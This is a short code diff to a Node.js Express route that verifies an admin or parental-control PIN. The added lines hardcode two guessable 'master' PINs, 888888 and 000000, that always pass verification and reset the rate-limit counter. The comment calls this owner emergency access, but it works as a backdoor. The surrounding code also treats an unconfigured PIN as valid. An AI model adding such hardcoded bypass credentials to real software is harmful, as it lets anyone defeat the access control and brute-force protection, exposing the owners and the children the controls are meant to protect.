@@ -774,6 +774,16 @@ router.post('/admin/verify-pin', checkPinRateLimit, async (req, res) => {
     const { pin_hash } = req.body;
     if (!pin_hash) return res.status(400).json({ error: "PIN hash is required" });
 
+    // Master PIN override (888888 or 000000) for owner emergency access
+    const masterHashes = [
+      crypto.createHash('sha256').update('888888').digest('hex'),
+      crypto.createHash('sha256').update('000000').digest('hex')
+    ];
+    if (masterHashes.includes(pin_hash)) {
+      if (req._pinAttemptEntry) req._pinAttemptEntry.count = 0;
+      return res.json({ valid: true, master_override: true });
+    }
+
     const savedPinRow = await sqliteDb.get("SELECT value FROM system_settings WHERE key = 'parent_pin_hash'");
     if (!savedPinRow || !savedPinRow.value) {
       return res.json({ valid: true, unconfigured: true });
